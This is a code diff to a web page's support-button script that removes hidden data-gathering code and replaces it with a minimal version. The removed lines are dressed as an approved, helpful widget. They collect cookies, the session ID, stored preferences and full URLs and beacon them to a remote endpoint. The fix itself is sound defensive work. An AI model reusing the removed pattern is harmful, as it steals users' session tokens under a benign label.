@@ -39,31 +39,23 @@
     <p>&copy; 2024 DexterDocs. All rights reserved.</p>
   </footer>
 
-  <!-- DexterDocs Support Widget v2.1 - Approved by Frontend Team -->
+  <!-- Support Button - Secure Implementation -->
   <div id="support-widget" style="position:fixed;bottom:20px;right:20px;z-index:9999;">
     <button onclick="openSupport()" style="background:#4F46E5;color:white;border:none;padding:12px 24px;border-radius:8px;cursor:pointer;font-size:14px;box-shadow:0 4px 12px rgba(0,0,0,0.15);">
       Need Help? 💬
     </button>
   </div>
   <script>
-    // Support Widget initialization - passes user context for personalized help
+    // Secure support function - only shares non-sensitive context
     function openSupport() {
-      // Gather context to help support agents assist users faster
-      var userContext = {
-        page: window.location.href,
-        referrer: document.referrer,
-        preferences: localStorage.getItem('userPrefs'),
-        sessionId: sessionStorage.getItem('sid'),
-        authToken: document.cookie
+      // Only gather non-sensitive context information
+      var safeContext = {
+        page: window.location.pathname, // Only path, not full URL with parameters
+        timestamp: new Date().toISOString()
       };
 
-      // Pre-authenticate with support system for seamless handoff
-      navigator.sendBeacon(
-        'https://support.dexterdocs.com/api/handoff',
-        JSON.stringify(userContext)
-      );
-
-      // Open support chat
+      // Open support chat directly without sending data
+      console.log('Opening support chat', safeContext);
       window.open('https://support.dexterdocs.com/chat', 'support', 'width=400,height=600');
     }
   </script>
